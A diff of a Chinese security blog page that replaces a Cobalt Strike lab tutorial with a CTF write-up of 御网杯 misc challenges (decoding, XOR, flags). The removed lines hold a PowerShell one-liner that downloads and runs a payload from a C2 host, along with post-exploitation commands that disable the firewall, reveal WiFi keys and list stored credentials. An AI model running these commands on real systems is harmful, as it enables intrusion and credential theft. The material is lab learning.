@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="信息收集, jothon&#39;s blog">
+    <meta name="keywords" content="御网杯, jothon&#39;s blog">
     <meta name="description" content="变强一点点">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>信息收集 | jothon&#39;s blog</title>
+    <title>御网杯 | jothon&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">信息收集</h1>
+                    <h1 class="description center-align post-title">御网杯</h1>
                 </div>
             </div>
         </div>
@@ -436,15 +436,6 @@
                 </div>
                 <div class="col s5 right-align">
                     
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
-                                内网渗透
-                            </a>
-                        
-                    </div>
-                    
                 </div>
             </div>
 
@@ -452,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2024-09-10
+                    2024-09-22
                 </div>
                 
 
@@ -476,89 +467,46 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="cobaltStrike4-3安装"><a href="#cobaltStrike4-3安装" class="headerlink" title="cobaltStrike4.3安装"></a>cobaltStrike4.3安装</h2><p>哎，装个4.0的版本还是不行，jdk版本是11的</p>
-<p>百度网盘：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1XOSL8o4hotOIJm1u9Raq9w">https://pan.baidu.com/s/1XOSL8o4hotOIJm1u9Raq9w</a> 提取码: n1qm </p>
-<p>kali里面解压缩：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ./teamserver 192.168.23.152 123456    #kali的ip地址，密码：123456[一次性的，可以随时更改]</span><br></pre></td></tr></table></figure>
+                <h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h3><p>考察知识点:word隐写</p>
+<p>wps打开，ctrl+A全选，调换颜色即可</p>
+<p><img src="/img/image-20240922181239546.png" alt="image-20240922181239546"></p>
+<p>flag{HNCTF9090AS9nbg87600hn77hn88}</p>
+<h3 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h3><p>考察知识点</p>
+<p>编码1：BrainFuck解码</p>
+<p><img src="/img/image-20240922202913546.png" alt="image-20240922202913546"></p>
+<p>编码2：JSFuck编码</p>
+<p><img src="/img/image-20240922203024347.png" alt="image-20240922203024347"></p>
+<p>编码3：ook解密</p>
+<p>在线网址：[Brainfuck&#x2F;Ook! Obfuscation&#x2F;Encoding <a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">splitbrain.org]</a></p>
+<p><img src="/img/image-20240922203218375.png" alt="image-20240922203218375"></p>
+<h3 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h3><p>分组字节流搜索flag,我们可以发现在长度为337，349，85的包里搜索到flag</p>
+<p><img src="/img/image-20240922225311013.png" alt="image-20240922225311013"></p>
+<p><img src="/img/image-20240922225334650.png" alt="image-20240922225334650"></p>
+<p>提取其16进制，保存为压缩包，打开我们可以发现flag.txt和key</p>
+<p>flag:</p>
+<p>10004583275926070044326083910251708233320797779355779208703097816305188140191914132269450797</p>
+<p>4e94dcdb6de87e65d263419ec45aec93e8a2e1d386b31fb804e0f02366df44dbe86a8a7c462d</p>
+<p>key</p>
+<p>5216294695211820293806247029887026154798297270637676463374801674229881314620340407569315152</p>
+<p>28f8bdbc16de4850e05579acf33c8aa08ac3d9e6e3822b8c3081c04700eb25b88a08eb457550</p>
+<p>转16进制进行XOR异或</p>
+<p><img src="/img/image-20240926194610800.png" alt="image-20240926194610800"></p>
+<p>flag{66526827ff3ba85e1444a0df4acbba93}</p>
+<h3 id="misc4"><a href="#misc4" class="headerlink" title="misc4"></a>misc4</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#x39;&amp;#x33;&amp;#x36;&amp;#x35;&amp;#x34;&amp;#x34;&amp;#x61;&amp;#x35;&amp;#x35;&amp;#x33;&amp;#x31;&amp;#x34;&amp;#x61;&amp;#x37;&amp;#x65;&amp;#x34;&amp;#x33;&amp;#x33;&amp;#x39;&amp;#x35;&amp;#x34;&amp;#x35;&amp;#x66;&amp;#x34;&amp;#x37;&amp;#x37;&amp;#x37;&amp;#x36;&amp;#x61;&amp;#x36;&amp;#x65;&amp;#x34;&amp;#x31;&amp;#x33;&amp;#x31;&amp;#x35;&amp;#x61;&amp;#x37;&amp;#x64;&amp;#x34;&amp;#x31;&amp;#x33;&amp;#x32;&amp;#x35;&amp;#x37;&amp;#x34;&amp;#x33;&amp;#x35;&amp;#x37;&amp;#x35;&amp;#x36;&amp;#x35;&amp;#x35;&amp;#x34;&amp;#x35;&amp;#x35;&amp;#x62;&amp;#x34;&amp;#x34;&amp;#x37;&amp;#x38;&amp;#x35;&amp;#x31;&amp;#x36;&amp;#x61;&amp;#x36;&amp;#x35;&amp;#x33;&amp;#x37;&amp;#x34;&amp;#x31;&amp;#x36;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/1726147569177-31.png" alt="img"></p>
-<p>windows下启动</p>
-<p><img src="/img/1726147569175-1.png" alt="img"></p>
-<p>成功连接</p>
-<p><img src="/img/1726147569175-2.png" alt="img"></p>
-<h2 id="cobaltStrike基本使用"><a href="#cobaltStrike基本使用" class="headerlink" title="cobaltStrike基本使用"></a>cobaltStrike基本使用</h2><p>准备一台肉鸡，这里我使用windows7来测试，哎，windows10好卡</p>
-<p>cs上</p>
-<p><img src="/img/1726147569175-3.png" alt="img"></p>
-<p>填写主机的ip地址，开启监听即可</p>
-<p><img src="/img/1726147569175-4.png" alt="img"></p>
-<p>window7上输入</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.5.48:80/a&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>连接成功，输入shell whoami来执行一下</p>
-<p><img src="/img/1726147569175-5.png" alt="img"></p>
-<h2 id="使用CS进行本地工作组收集信息"><a href="#使用CS进行本地工作组收集信息" class="headerlink" title="使用CS进行本地工作组收集信息"></a>使用CS进行本地工作组收集信息</h2><p>Shell ipconfig,可以查看到其ip地址</p>
-<p><img src="/img/1726147569175-6.png" alt="img"></p>
-<p>shell systeminfo</p>
-<p><img src="/img/1726147569175-7.png" alt="img"></p>
-<p>查看系统结构体系结构</p>
-<p>echo %PROCESSOR_ARCHITECTURE%</p>
-<p><img src="/img/1726147569175-8.png" alt="img"></p>
-<p>查看系统安装了哪些软件及版本：wmic product get name,version</p>
-<p><img src="/img/1726147569176-9.png" alt="img"></p>
-<p>本机运行服务：wmic service list brief</p>
-<p><img src="/img/1726147569176-10.png" alt="img"></p>
-<p>查看进程:tasklist</p>
-<p><img src="/img/1726147569176-11.png" alt="img"></p>
-<p>查看计划任务：schtasks &#x2F;query &#x2F;fo LIST &#x2F;v  [如果报错的话可以先输入chcp473改变其编码]</p>
-<p><img src="/img/1726147569176-12.png" alt="img"></p>
-<p>电脑开机时间：net statistics workstation</p>
-<p><img src="/img/1726147569176-13.png" alt="img"></p>
-<p>查看本地有几个用户：net user</p>
-<p><img src="/img/1726147569176-14.png" alt="img"></p>
-<p>当前会话列表：net session</p>
-<p><img src="/img/1726147569176-15.png" alt="img"></p>
-<p>查询端口开放信息： netstat -ano</p>
-<p><img src="/img/1726147569176-16.png" alt="img"></p>
-<p>查询补丁信息：依旧可以使用shell systeminfo来查看</p>
-<p><img src="/img/1726147569176-17.png" alt="img"></p>
-<p>查看杀毒软件信息：wmic &#x2F;namespace:\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe，目标靶机没有杀毒软件，就以我的主机为例</p>
-<p><img src="/img/1726147569176-18.png" alt="img"></p>
-<p>查询共享列表：net share</p>
-<p><img src="/img/1726147569176-19.png" alt="img"></p>
-<p>查看路由信息：route print</p>
-<p><img src="/img/1726147569176-20.png" alt="img"></p>
-<p>查看防火墙的禁用状态：netsh firewall show state</p>
-<p><img src="/img/1726147569176-21.png" alt="img"></p>
-<p>关闭防火墙的命令</p>
-<p>Netsh firewall set opmode  disable</p>
-<p><img src="/img/1726147569176-22.png" alt="img"></p>
-<p>防火墙允许3389端口放行</p>
-<p>netsh firewall set portopening TCP 3389 ENABLE</p>
-<p><img src="/img/1726147569176-23.png" alt="img"></p>
-<p>查看当前连接wifi密码名字</p>
-<p>netsh wlan show profile name&#x3D;”HYNUCTF520” key&#x3D;clear</p>
-<p><img src="/img/1726147569176-24.png" alt="img"></p>
-<p>查看rdp端口</p>
-<p>REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server\WinStations\RDP-Tcp &#x2F;v PortNumber    #16进制转10进制为3389</p>
-<p><img src="/img/1726147569176-25.png" alt="img"></p>
-<p>查看当前凭据</p>
-<p>cmdkey &#x2F;l</p>
-<p><img src="/img/1726147569176-26.png" alt="img"></p>
-<p>查看局域网所有IP信息</p>
-<p>Arp-a </p>
-<p><img src="/img/1726147569176-27.png" alt="img"></p>
-<p>查看最近打开的文件</p>
-<p>Dir %appdata%\Microsoft\Windows\Recent</p>
-<p><img src="/img/1726147569177-28.png" alt="img"></p>
-<p>查看本地工作组</p>
-<p>Net localgroup</p>
-<p><img src="/img/1726147569177-29.png" alt="img"></p>
-<p>查看本地工作组users</p>
-<p>Net localgroup users</p>
-<p><img src="/img/1726147569177-30.png" alt="img"></p>
-<p>查看rdp的保存凭据</p>
-<p>dir &#x2F;a %userprofile%\AppData\Local\Microsoft\Credentials*</p>
-<p><img src="/img/image-20240913084522181.png" alt="image-20240913084522181"></p>
+<p>很明显的一段unicode解码，随波逐流解码得</p>
+<p><img src="/img/image-20240922203522270.png" alt="image-20240922203522270"></p>
+<p>936544a55314a7e4339545f47776a6e41315a7d41325743575655455b4478516a6537416</p>
+<p>逆序得：6147356a6158744b55455657534752314d7a51314e6a67774f5459334e7a41355a445639</p>
+<p>16机制转ascii可得</p>
+<p><img src="/img/image-20240922203708424.png" alt="image-20240922203708424"></p>
+<p>aG5jaXtKUEVWSGR1MzQ1NjgwOTY3NzA5ZDV9</p>
+<p>base64解密</p>
+<p><img src="/img/image-20240922203747729.png" alt="image-20240922203747729"></p>
+<p>hnci{JPEVHdu345680967709d5}</p>
+<p>可以观察到hnci与flag之间h向后退了2格，根据f-&gt;h,l-&gt;n,a-&gt;c,g-&gt;i</p>
+<p>我们可以得出flag</p>
+<p>flag{HNCTFbs345680967709b5}</p>
 
                 
             </div>
@@ -585,7 +533,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://jothon.github.io/2024/09/10/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">https://jothon.github.io/2024/09/10/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</a>
+                    <a href="https://jothon.github.io/2024/09/22/%E5%BE%A1%E7%BD%91%E6%9D%AF/">https://jothon.github.io/2024/09/22/%E5%BE%A1%E7%BD%91%E6%9D%AF/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -790,9 +738,48 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
+            <div class="card">
+                <a href="/2024/09/22/%E5%BE%A1%E7%BD%91%E6%9D%AF/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="御网杯">
+                        
+                        <span class="card-title">御网杯</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-09-22
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            jothon
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/2024/09/19/JWT%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
                     <div class="card-image">
@@ -810,54 +797,13 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2024-09-19
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-09-19
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
                             jothon
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2024/09/04/BaseCTF/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="BaseCTF">
-                        
-                        <span class="card-title">BaseCTF</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2024-09-04
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" class="post-category">
-                                    比赛复现
-                                </a>
-                            
                             
                         </span>
                     </div>
